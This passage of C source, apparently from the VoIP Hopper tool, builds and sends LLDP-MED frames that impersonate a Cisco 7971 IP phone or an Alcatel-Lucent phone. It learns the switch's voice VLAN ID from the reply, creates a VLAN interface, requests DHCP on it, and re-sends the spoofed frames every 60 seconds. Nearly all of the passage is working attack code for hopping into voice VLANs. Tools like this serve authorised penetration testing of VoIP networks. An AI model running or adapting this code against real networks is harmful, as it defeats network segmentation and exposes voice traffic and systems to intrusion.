        lldp_portdesc->tlvlength = 0x07;
	/* This creates 'SW PORT' */
        lldp_portdesc->value[0] = 0x53;
        lldp_portdesc->value[1] = 0x57;
        lldp_portdesc->value[2] = 0x20;
        lldp_portdesc->value[3] = 0x50;
        lldp_portdesc->value[4] = 0x4f;
        lldp_portdesc->value[5] = 0x52;
        lldp_portdesc->value[6] = 0x54;


	/* make System Name */
        lldp_sname=(struct lldpsname *)((void*)lldp_portdesc + sizeof(struct lldpportdesc));
        lldp_sname->tlvtype = 0x0a;
        lldp_sname->tlvlength = 0x19;

	/* if assessment mode, we must spoof a hard-coded system name */
	if (assessment_mode == 1) {
		/* This creates 'SEP001EF7289C8E.cisco.com' */
        	lldp_sname->value[0] = 0x53;
        	lldp_sname->value[1] = 0x45;
        	lldp_sname->value[2] = 0x50;
        	lldp_sname->value[3] = 0x30;
        	lldp_sname->value[4] = 0x30;
        	lldp_sname->value[5] = 0x31;
        	lldp_sname->value[6] = 0x45;
        	lldp_sname->value[7] = 0x46;
        	lldp_sname->value[8] = 0x37;
        	lldp_sname->value[9] = 0x32;
        	lldp_sname->value[10] = 0x38;
        	lldp_sname->value[11] = 0x39;
        	lldp_sname->value[12] = 0x43;
        	lldp_sname->value[13] = 0x38;
        	lldp_sname->value[14] = 0x45;
        	lldp_sname->value[15] = 0x2e;
        	lldp_sname->value[16] = 0x63;
        	lldp_sname->value[17] = 0x69;
        	lldp_sname->value[18] = 0x73;
        	lldp_sname->value[19] = 0x63;
        	lldp_sname->value[20] = 0x6f;
        	lldp_sname->value[21] = 0x2e;
        	lldp_sname->value[22] = 0x63;
        	lldp_sname->value[23] = 0x6f;
        	lldp_sname->value[24] = 0x6d;

	/* if else is true below, then the user has supplied their own mac address for spoofing lldp system name */
	} else {
		char strSname[45];
		sprintf(strSname,"SEP%s.cisco.com",tmpMac2);
		memcpy(lldp_sname->value,strSname,strlen(strSname));
	}

	/* make Capabilities */
        lldp_caps=(struct lldpcaps *)((void*)lldp_sname + sizeof(struct lldpsname));
        lldp_caps->tlvtype = 0x0e;
        lldp_caps->tlvlength = 0x04;
	/* This makes 'Capabilities' of 0x0024, which is bridge and telephone*/
	/* This makes 'Enabled Capabilities' of 0x0024, which is bridge and telephone */
        lldp_caps->value[0] = 0x00;
        lldp_caps->value[1] = 0x24;
        lldp_caps->value[2] = 0x00;
        lldp_caps->value[3] = 0x24;

	/* make IEEE 802.3 - MAC/PHY Configuration/Status */
        lldp_macphy=(struct lldpmacphy *)((void*)lldp_caps + sizeof(struct lldpcaps));
        lldp_macphy->tlvtype = 0xfe;
        lldp_macphy->tlvlength = 0x09;
	/* The following 9 bytes make the following:
	Organization Unique Code:  IEEE 802.3 (0x00120f)
	IEEE 802.3 Subtype:  MAC/PHY Configuration/Status (0x01)
	Auto-Negotiation Support/Status:  0x03
	PMD Auto-Negotiation Advertised Capability:  0x8036
	Same in inverse (wrong) bitorder
	Operational MAU Type:  1000BaseTFD - Four-pair Category 5 UTP, full duplex mode (0x001E)
	*/
        lldp_macphy->value[0] = 0x00;
        lldp_macphy->value[1] = 0x12;
        lldp_macphy->value[2] = 0x0f;
        lldp_macphy->value[3] = 0x01;
        lldp_macphy->value[4] = 0x03;
        lldp_macphy->value[5] = 0x80;
        lldp_macphy->value[6] = 0x36;
        lldp_macphy->value[7] = 0x00;
        lldp_macphy->value[8] = 0x1e;

        /* make Media Capabilities */
        lldp_mediacaps=(struct lldpmediacaps *)((void*)lldp_macphy + sizeof(struct lldpmacphy));
        lldp_mediacaps->tlvtype = 0xfe;
        lldp_mediacaps->tlvlength = 0x07;
	/* Makes following
	Organization Unique Code:  TIA (0x0012bb)
	Media Subtype: Media Capabilities (0x01)
	Capabilities:  0x0033
	Class Type:  Endpoint Class III
	*/
        lldp_mediacaps->value[0] = 0x00;
        lldp_mediacaps->value[1] = 0x12;
        lldp_mediacaps->value[2] = 0xbb;
        lldp_mediacaps->value[3] = 0x01;
        lldp_mediacaps->value[4] = 0x00;
        lldp_mediacaps->value[5] = 0x33;
        lldp_mediacaps->value[6] = 0x03;

        /* make TIA - Network Policy (Voice) */
        lldp_networkpolicyv=(struct lldpnetworkpolicy *)((void*)lldp_mediacaps + sizeof(struct lldpmediacaps));
        lldp_networkpolicyv->tlvtype = 0xfe;
        lldp_networkpolicyv->tlvlength = 0x08;
	/* Makes following
	Organization Unique Code:  TIA (0x0012bb)
	Media Subtype:  Network Policy (0x02)
	Application Type:  Voice (1)
	Policy:  Unknown
	Tagged:  No
	VLAN Id:  0
	L2 Priority:  4
	DSCP Value:  32
	*/
        lldp_networkpolicyv->value[0] = 0x00;
        lldp_networkpolicyv->value[1] = 0x12;
        lldp_networkpolicyv->value[2] = 0xbb;
        lldp_networkpolicyv->value[3] = 0x02;
        lldp_networkpolicyv->value[4] = 0x01;
        lldp_networkpolicyv->value[5] = 0x80;
        lldp_networkpolicyv->value[6] = 0x01;
        lldp_networkpolicyv->value[7] = 0x20;


        /* make TIA - Network Policy (Voice Signaling) */
        lldp_networkpolicyvs=(struct lldpnetworkpolicy *)((void*)lldp_networkpolicyv + sizeof(struct lldpnetworkpolicy));
        lldp_networkpolicyvs->tlvtype = 0xfe;
        lldp_networkpolicyvs->tlvlength = 0x08;
        /* Makes following
        Organization Unique Code:  TIA (0x0012bb)
        Media Subtype:  Network Policy (0x02)
        Application Type:  Voice Signaling (2)
        Policy:  Unknown
        Tagged:  No
        VLAN Id:  0
        L2 Priority:  4
        DSCP Value:  32
        */
        lldp_networkpolicyvs->value[0] = 0x00;
        lldp_networkpolicyvs->value[1] = 0x12;
        lldp_networkpolicyvs->value[2] = 0xbb;
        lldp_networkpolicyvs->value[3] = 0x02;
        lldp_networkpolicyvs->value[4] = 0x02;
        lldp_networkpolicyvs->value[5] = 0x80;
        lldp_networkpolicyvs->value[6] = 0x01;
        lldp_networkpolicyvs->value[7] = 0x20;

        /* make TIA - Extended Power-via-MDI */
        lldp_extpvm=(struct lldpextpvm *)((void*)lldp_networkpolicyvs + sizeof(struct lldpnetworkpolicy));
        lldp_extpvm->tlvtype = 0xfe;
        lldp_extpvm->tlvlength = 0x07;
        /* Makes following
	Organization Unique Code:  TIA (0x0012bb)
	Media Subtype:  Extended Power-via-MDI (0x04)
	Power Type:  PD Device
	Power Source:  PSE
	Power Priority:  Unknown
	Power Value:  14900 mW
	*/
        lldp_extpvm->value[0] = 0x00;
        lldp_extpvm->value[1] = 0x12;
        lldp_extpvm->value[2] = 0xbb;
        lldp_extpvm->value[3] = 0x04;
        lldp_extpvm->value[4] = 0x50;
        lldp_extpvm->value[5] = 0x00;
        lldp_extpvm->value[6] = 0x95;

        /* make TIA - Inventory - Hardware Revision */
        lldp_inventoryhr=(struct lldpinventoryhr *)((void*)lldp_extpvm + sizeof(struct lldpextpvm));
        lldp_inventoryhr->tlvtype = 0xfe;
        lldp_inventoryhr->tlvlength = 0x05;
	/*
	Organization Unique Code:  TIA (0x0012bb)
	Media Subtype:  Inventory - Hardware Revision (0x05)
	Hardware Revision:  3
	*/
        lldp_inventoryhr->value[0] = 0x00;
        lldp_inventoryhr->value[1] = 0x12;
        lldp_inventoryhr->value[2] = 0xbb;
        lldp_inventoryhr->value[3] = 0x05;
        lldp_inventoryhr->value[4] = 0x33;


        /* make TIA - Inventory - Firmware Revision */
        lldp_inventoryfr=(struct lldpinventoryfr *)((void*)lldp_inventoryhr + sizeof(struct lldpinventoryhr));
        lldp_inventoryfr->tlvtype = 0xfe;
        lldp_inventoryfr->tlvlength = 0x18;
        /*
        Organization Unique Code:  TIA (0x0012bb)
	Media Subtype:  Inventory - Firmware Revision (0x06)
	Firmware Revision:  7971_020706_cert.bin
        */
        lldp_inventoryfr->value[0] = 0x00;
        lldp_inventoryfr->value[1] = 0x12;
        lldp_inventoryfr->value[2] = 0xbb;
        lldp_inventoryfr->value[3] = 0x06;
        lldp_inventoryfr->value[4] = 0x37;
        lldp_inventoryfr->value[5] = 0x39;
        lldp_inventoryfr->value[6] = 0x37;
        lldp_inventoryfr->value[7] = 0x31;
        lldp_inventoryfr->value[8] = 0x5f;
        lldp_inventoryfr->value[9] = 0x30;
        lldp_inventoryfr->value[10] = 0x32;
        lldp_inventoryfr->value[11] = 0x30;
        lldp_inventoryfr->value[12] = 0x37;
        lldp_inventoryfr->value[13] = 0x30;
        lldp_inventoryfr->value[14] = 0x36;
        lldp_inventoryfr->value[15] = 0x5f;
        lldp_inventoryfr->value[16] = 0x63;
        lldp_inventoryfr->value[17] = 0x65;
        lldp_inventoryfr->value[18] = 0x72;
        lldp_inventoryfr->value[19] = 0x74;
        lldp_inventoryfr->value[20] = 0x2e;
        lldp_inventoryfr->value[21] = 0x62;
        lldp_inventoryfr->value[22] = 0x69;
        lldp_inventoryfr->value[23] = 0x6e;

        /* make TIA - Inventory - Software Revision */
        lldp_inventorysr=(struct lldpinventorysr *)((void*)lldp_inventoryfr + sizeof(struct lldpinventoryfr));
        lldp_inventorysr->tlvtype = 0xfe;
        lldp_inventorysr->tlvlength = 0x14;
        /*
        Organization Unique Code:  TIA (0x0012bb)
	Media Subtype:  Inventory - Software Revision (0x07)
	Software Revision:  SCCP70.8-3-3SR2S
        */
        lldp_inventorysr->value[0] = 0x00;
        lldp_inventorysr->value[1] = 0x12;
        lldp_inventorysr->value[2] = 0xbb;
        lldp_inventorysr->value[3] = 0x07;
        lldp_inventorysr->value[4] = 0x53;
        lldp_inventorysr->value[5] = 0x43;
        lldp_inventorysr->value[6] = 0x43;
        lldp_inventorysr->value[7] = 0x50;
        lldp_inventorysr->value[8] = 0x37;
        lldp_inventorysr->value[9] = 0x30;
        lldp_inventorysr->value[10] = 0x2e;
        lldp_inventorysr->value[11] = 0x38;
        lldp_inventorysr->value[12] = 0x2d;
        lldp_inventorysr->value[13] = 0x33;
        lldp_inventorysr->value[14] = 0x2d;
        lldp_inventorysr->value[15] = 0x33;
        lldp_inventorysr->value[16] = 0x53;
        lldp_inventorysr->value[17] = 0x52;
        lldp_inventorysr->value[18] = 0x32;
        lldp_inventorysr->value[19] = 0x53;

        /* make TIA - Inventory - Serial Number */
        lldp_inventorysn=(struct lldpinventorysn *)((void*)lldp_inventorysr + sizeof(struct lldpinventorysr));
        lldp_inventorysn->tlvtype = 0xfe;
        lldp_inventorysn->tlvlength = 0x0f;
        /*
        Organization Unique Code:  TIA (0x0012bb)
        Media Subtype:  Inventory - Serial Number (0x08)
        Serial Number:  FCH12028WCZ 
        */
        lldp_inventorysn->value[0] = 0x00;
        lldp_inventorysn->value[1] = 0x12;
        lldp_inventorysn->value[2] = 0xbb;
        lldp_inventorysn->value[3] = 0x08;
        lldp_inventorysn->value[4] = 0x46;
        lldp_inventorysn->value[5] = 0x43;
        lldp_inventorysn->value[6] = 0x48;
        lldp_inventorysn->value[7] = 0x31;
        lldp_inventorysn->value[8] = 0x32;
        lldp_inventorysn->value[9] = 0x30;
        lldp_inventorysn->value[10] = 0x32;
        lldp_inventorysn->value[11] = 0x38;
        lldp_inventorysn->value[12] = 0x57;
        lldp_inventorysn->value[13] = 0x43;
        lldp_inventorysn->value[14] = 0x5a;

        /* make TIA - Inventory - Manufacturer Name */
        lldp_inventorymn=(struct lldpinventorymn *)((void*)lldp_inventorysn + sizeof(struct lldpinventorysn));
        lldp_inventorymn->tlvtype = 0xfe;
        lldp_inventorymn->tlvlength = 0x17;
        /*
        Organization Unique Code:  TIA (0x0012bb)
        Media Subtype:  Inventory - Manufacturer Name (0x09)
        Manufacturer Name:  Cisco Systems, Inc. 
        */
        lldp_inventorymn->value[0] = 0x00;
        lldp_inventorymn->value[1] = 0x12;
        lldp_inventorymn->value[2] = 0xbb;
        lldp_inventorymn->value[3] = 0x09;
        lldp_inventorymn->value[4] = 0x43;
        lldp_inventorymn->value[5] = 0x69;
        lldp_inventorymn->value[6] = 0x73;
        lldp_inventorymn->value[7] = 0x63;
        lldp_inventorymn->value[8] = 0x6f;
        lldp_inventorymn->value[9] = 0x20;
        lldp_inventorymn->value[10] = 0x53;
        lldp_inventorymn->value[11] = 0x79;
        lldp_inventorymn->value[12] = 0x73;
        lldp_inventorymn->value[13] = 0x74;
        lldp_inventorymn->value[14] = 0x65;
        lldp_inventorymn->value[15] = 0x6d;
        lldp_inventorymn->value[16] = 0x73;
        lldp_inventorymn->value[17] = 0x2c;
        lldp_inventorymn->value[18] = 0x20;
        lldp_inventorymn->value[19] = 0x49;
        lldp_inventorymn->value[20] = 0x6e;
        lldp_inventorymn->value[21] = 0x63;
        lldp_inventorymn->value[22] = 0x2e;

        /* make TIA - Inventory - Model Name */
        lldp_inventorymodelname=(struct lldpinventorymodelname *)((void*)lldp_inventorymn + sizeof(struct lldpinventorymn));
        lldp_inventorymodelname->tlvtype = 0xfe;
        lldp_inventorymodelname->tlvlength = 0x0f;
        /*
        Organization Unique Code:  TIA (0x0012bb)
        Media Subtype:  Inventory - Model Name (0x0a)
        Model Name:  CP-7971G-GE 
        */
        lldp_inventorymodelname->value[0] = 0x00;
        lldp_inventorymodelname->value[1] = 0x12;
        lldp_inventorymodelname->value[2] = 0xbb;
        lldp_inventorymodelname->value[3] = 0x0a;

        lldp_inventorymodelname->value[4] = 0x43;
        lldp_inventorymodelname->value[5] = 0x50;
        lldp_inventorymodelname->value[6] = 0x2d;
        lldp_inventorymodelname->value[7] = 0x37;
        lldp_inventorymodelname->value[8] = 0x39;
        lldp_inventorymodelname->value[9] = 0x37;
        lldp_inventorymodelname->value[10] = 0x31;
        lldp_inventorymodelname->value[11] = 0x47;
        lldp_inventorymodelname->value[12] = 0x2d;
        lldp_inventorymodelname->value[13] = 0x47;
        lldp_inventorymodelname->value[14] = 0x45;

        /* make TIA - Inventory - Asset ID */
        lldp_inventoryai=(struct lldpinventoryai *)((void*)lldp_inventorymodelname + sizeof(struct lldpinventorymodelname));
        lldp_inventoryai->tlvtype = 0xfe;
        lldp_inventoryai->tlvlength = 0x04;
        /*
        Organization Unique Code:  TIA (0x0012bb)
        Media Subtype:  Inventory - Asset ID (0x0b)
        */
        lldp_inventoryai->value[0] = 0x00;
        lldp_inventoryai->value[1] = 0x12;
        lldp_inventoryai->value[2] = 0xbb;
        lldp_inventoryai->value[3] = 0x0b;

	/* End of LLDPDU */
	lldp_endpdu=(struct lldpendpdu *)((void*)lldp_inventoryai + sizeof(struct lldpinventoryai));
	lldp_endpdu->tlvtype = 0x00;
	lldp_endpdu->tlvtype = 0x00;

	lldpend=(u_char *)((void *)lldp_endpdu + SIZE_ETHERNET);

	return ((void *)lldpend - (void *)&lldpframe[0]);
}
int spoof_lldp(char *IfName_temp, char *lldpdev) {

	int atsock;

	if ((atsock=init_socket_eth(IfName_temp))<=0){
		printf("The interface %s must have a valid IP address in order for the LLDP spoofing code to work.\nFirst set the IP address static or via DHCP, and then run again.\n",IfName);
		printf("Could not initialize LLDP attack socket\n");
		return(-1);
	}

	unsigned int retval = mk_spoof_lldp(lldpdev);
	printf("Made LLDP packet of %d bytes - ",retval);

	int retval2;
	retval2 = sendpack_eth(IfName_temp,atsock,lldpframe,retval);
	printf("Sent LLDP packet of %d bytes\n",retval2);

	/* Set the sent lldp packet length to a global variable that can be checked in the pcap section for lldp, since we don't want to decode and display this packet, at least for now */
	spoofed_lldp_packet_len = retval2;

}
spoof_lldp_loop(char *lldpdev, char *interface) {

	int atsock;
	int vvid = 0;
	pcap_t *pcap_handle;

	if ((atsock=init_socket_eth(interface))<=0){
		printf("The interface %s must have a valid IP address in order for the LLDP spoofing code to work.\nFirst set the IP address static or via DHCP, and then run again.\n",IfName);
		printf("Could not initialize LLDP attack socket\n");
		exit(1);
	}
	
	pcap_handle = create_lldp_pcap(interface);

	if(alcatel_yes == 1 && alcatelmode == 1) {

		printf("Alcatel mode lldp-med spoofing, creating 1st packet!\n");

                /* First LLDP Packet when IP Phone boots */
                printf("Sending 1st Alcatel-Lucent LLDP Spoofed packet on %s with LLDP packet data:\n",interface);
                unsigned int retval = mk_spoof_lldp_a1(lldpdev);
                printf("Made LLDP packet of %d bytes - ",retval);

                int retval2;
                retval2 = sendpack_eth(interface,atsock,lldpframe,retval);
                printf("Sent LLDP packet of %d bytes\n",retval2);

	} else {

		/* First LLDP Packet when IP Phone boots */
		printf("Sending 1st LLDP Spoofed packet on %s with LLDP packet data:\n",interface);
        	unsigned int retval = mk_spoof_lldp(lldpdev);
        	printf("Made LLDP packet of %d bytes - ",retval);

        	int retval2;
        	retval2 = sendpack_eth(interface,atsock,lldpframe,retval);
        	printf("Sent LLDP packet of %d bytes\n",retval2);

	}

	/* Get the sent packet off the buffer wire*/
	int pcap_return = pcap_next_ex(handle, &header, &packet);
	
	/* This packet should be response from Switch */
	int timeout_counter = 0;
	while (timeout_counter < 5) {

		pcap_return = pcap_next_ex(handle, &header, &packet);

		if (pcap_return <= 0) {

			/* Read timeout of 1 second reached - can later make this a debug statement */
			printf("Read timeout in pcap_next_ex ~ Still waiting for LLDP packet\n");
			timeout_counter++;

		} else {
			// decode the lldp packet, vvid or not
			vvid = get_lldp(header, packet);
			timeout_counter = 5;
		}
	}
	printf("Giving up on receiving a response for this LLDP packet\n");


        if(alcatel_yes == 1 && alcatelmode == 1) {

        	/* Second LLDP Packet when IP Phone boots */
        	printf("Sending 2nd Alcatel-Lucent LLDP Spoofed packet on %s with LLDP packet data:\n",interface);

        	int retval = mk_spoof_lldp_a2(lldpdev);
        	printf("Made LLDP packet of %d bytes - ",retval);

        	int retval2 = sendpack_eth(interface,atsock,lldpframe,retval);
        	printf("Sent LLDP packet of %d bytes\n",retval2);

        	/* Get the sent packet off the buffer wire*/
        	pcap_return = pcap_next_ex(handle, &header, &packet);

        } else {

        	/* Second LLDP Packet when IP Phone boots */
        	printf("Sending 2nd LLDP Spoofed packet on %s with LLDP packet data:\n",interface);

        	int retval = mk_spoof_lldp(lldpdev);
        	printf("Made LLDP packet of %d bytes - ",retval);

        	int retval2 = sendpack_eth(interface,atsock,lldpframe,retval);
        	printf("Sent LLDP packet of %d bytes\n",retval2);

        	/* Get the sent packet off the buffer wire*/
        	pcap_return = pcap_next_ex(handle, &header, &packet);

	}

       	/* This packet should be response from Switch */
	timeout_counter = 0;
	while (timeout_counter < 5) {

                pcap_return = pcap_next_ex(handle, &header, &packet);

                if (pcap_return <= 0) {

                        /* Read timeout of 1 second reached - can later make this a debug statement */
                        printf("Read timeout in pcap_next_ex ~ Still waiting for LLDP packet\n");
			timeout_counter++;
                        
                } else {
                        vvid = get_lldp(header, packet);
			timeout_counter = 5;
                }
        }
	printf("Giving up on receiving a response for this LLDP packet\n");

	pcap_freecode(&fp);
	pcap_close(handle);
	/* End Using pcap */

	// Only create a VLAN interface if VVID was decoded in LLDP response
	if (vvid != 0) {

		/* Create a string for new voice interface */
                char vinterface[BUFSIZ];
                snprintf(vinterface, sizeof(vinterface), "%s.%d", interface, vvid);

		/* Check to make sure interface isn't already configured */
		int retval = pcap_lookupnet(vinterface, &net, &mask, errbuf);
		if (retval == 0) {

			/* Get network address and netmask */
			char *net_str = NULL;
			char *mask_str = NULL;
			struct in_addr tmp_ip;
			struct in_addr tmp_mask;
			memcpy(&tmp_ip.s_addr, &net, sizeof(u_int8_t)*4);
			net_str = inet_ntoa(tmp_ip);

			printf("Voice VLAN interface %s is already configured:\n\n",vinterface);

			if(net_str == NULL) {
				perror("inet_ntoa error\n");
				return(-1);
			} else {
				printf("Network Address:  %s\n", net_str);
			}

			memcpy(&tmp_mask.s_addr, &mask, sizeof(u_int8_t)*4);
			mask_str = inet_ntoa(tmp_mask);

			if(mask_str == NULL) {
				perror("inet_ntoa error\n");
				return(-1);
			} else {
				printf("Netmask:  %s\n",mask_str);
			}


			printf("\nTo delete interface, run command:\n");
			printf("'voiphopper -d %s'\n\n",vinterface);
			exit(1);

		}

		/* Add the VVID interface */
		create_vlan_interface(interface, vvid);
		printf("Added VLAN %u to Interface %s\n",vvid, interface);

		if(alcatel_yes != 1) {
			printf("VoIP Hopper will sleep and then send LLDP Packets every 60 seconds\n");
			printf("Attempting dhcp request for new interface %s\n",vinterface);
                	int return_value = dhcpclientcall(vinterface);
		} else {
			printf("Attempting dhcp request for new interface %s\n",vinterface);
			alcatel_vvid_disc = 1;
                	int return_value = dhcpclientcall(vinterface);
			return;
		}
	} else {
		// Not doing dhcp client call
		printf("VoIP Hopper will sleep and then send LLDP Packets every 60 seconds\n");

	}

	/* Enter a loop in order to send LLDP spoofed packet every minute */
	unsigned int ksleeps;
	unsigned int sleepseconds = 60;
	ksleeps = sleep(sleepseconds);
	for ( ; ; ){

		printf("Sending LLDP Spoofed packet on %s with LLDP packet data:\n",IfName);
		int retval;
		if(alcatel_yes == 1 && alcatelmode == 1) {
			retval = mk_spoof_lldp_a2(lldpdev);
		} else {
			retval = mk_spoof_lldp(lldpdev);
		}
		printf("Made LLDP packet of %d bytes - ",retval);

		int retval2;
		retval2 = sendpack_eth(IfName,atsock,lldpframe,retval);
		printf("Sent LLDP packet of %d bytes\n",retval2);

		printf("Sleeping for 60 seconds before sending another LLDP packet\n\n");
		ksleeps = sleep(sleepseconds);

	}


}
pcap_t * create_lldp_pcap(char *IfName_temp){

        char lldp_filter_exp[] = "ether proto 0x88CC";

        if (IfName_temp == NULL) {
                        IfName_temp = pcap_lookupdev(errbuf);
                        if (IfName_temp == NULL) {
                                fprintf(stderr, "Couldn't find default device: %s\n",errbuf);
                                exit(EXIT_FAILURE);
                        }
                        printf("Interface not specified - Using first usable default device: ");
                        printf("%s\n", IfName_temp);
                }

                if (pcap_lookupnet(IfName_temp, &net, &mask, errbuf) == -1) {
                        fprintf(stderr, "Couldn't get netmask for device %s.  Enable the interface first and assign an IP address: %s\n", IfName, errbuf);
                        net = 0;
                        mask = 0;
                        exit(EXIT_FAILURE);
                }

                printf("Capturing LLDP Packets on %s\n", IfName_temp);

                handle = pcap_open_live(IfName_temp, SNAP_LEN, 1, 1000, errbuf);
                if (handle == NULL) {
                        fprintf(stderr, "Couldn't open device %s: %s\n", IfName_temp, errbuf);
                        exit(EXIT_FAILURE);
                }
                if (pcap_datalink(handle) != DLT_EN10MB) {
                        fprintf(stderr, "\n%s is not an Ethernet Interface\n", IfName_temp);
                        exit(EXIT_FAILURE);
                }

                if (pcap_compile(handle, &fp, lldp_filter_exp, 0, net) == -1) {
                        fprintf(stderr, "Couldn't parse lldp filter %s: %s\n",
                            lldp_filter_exp, pcap_geterr(handle));
                        exit(EXIT_FAILURE);
                }

                if (pcap_setfilter(handle, &fp) == -1) {
                        fprintf(stderr, "Couldn't install filter %s: %s\n",
                            lldp_filter_exp, pcap_geterr(handle));
                        exit(EXIT_FAILURE);
                }

          return handle;
}
void *send_lldp(void *threadarg, char *lldpdev){

        int atsock;
        atsock = (int)threadarg;
        int retval;

        unsigned int ksleeps;
        unsigned int sleepseconds = 60;
        ksleeps = sleep(sleepseconds);

        for ( ; ; ){
                printf("Sending LLDP Spoofed packet on %s with LLDP packet data:\n",IfName);
                retval = mk_spoof_lldp(lldpdev);
                printf("Made LLDP packet of %d bytes - ",retval);

                int retval2;
                retval2 = sendpack_eth(IfName,atsock,lldpframe,retval);

		printf("Sent LLDP packet of %d bytes\n",retval2);
		printf("Sleeping for 60 seconds before sending another LLDP packet\n\n");

                ksleeps = sleep(sleepseconds);

        }

}
int lldpcompare( char *sysnamebuff, struct lldphost *mylldphost) {

	/* return 1 if I'm adding a new lldp endpoint to the struct; else, return 0 */

	if(lldpcount == 0) {
		// copy in first lldp-med system name
		strcpy(mylldphost[0].systemname,sysnamebuff);
		//printf("Adding first sytem name in to mylldphost struct:  %s\n",mylldphost[0].systemname);	
		lldpcount++;
		return 1;

	} else {

		int a, val;
		for(a = 0; a < lldpcount; a++) {
			
			// loop through the structure and see if system name has been found before
			val = strcmp(sysnamebuff,mylldphost[a].systemname);
			//printf("comparing %s to %s, val:  %d\n",sysnamebuff,mylldphost[a].systemname,val);

			if (val == 0) {
				//printf("System name of %s is already in structure\n",sysnamebuff);
				return 0;
				//received system name is already in structure
			}

		}

		// If we have made it to this point, then it should be a new host
		if (val != 0) {
			strcpy(mylldphost[lldpcount].systemname,sysnamebuff);
			//printf("Adding new system name into lldp-med structure: %s\n",mylldphost[lldpcount].systemname);
			lldpcount++;
			return 1;
		}

	}

}
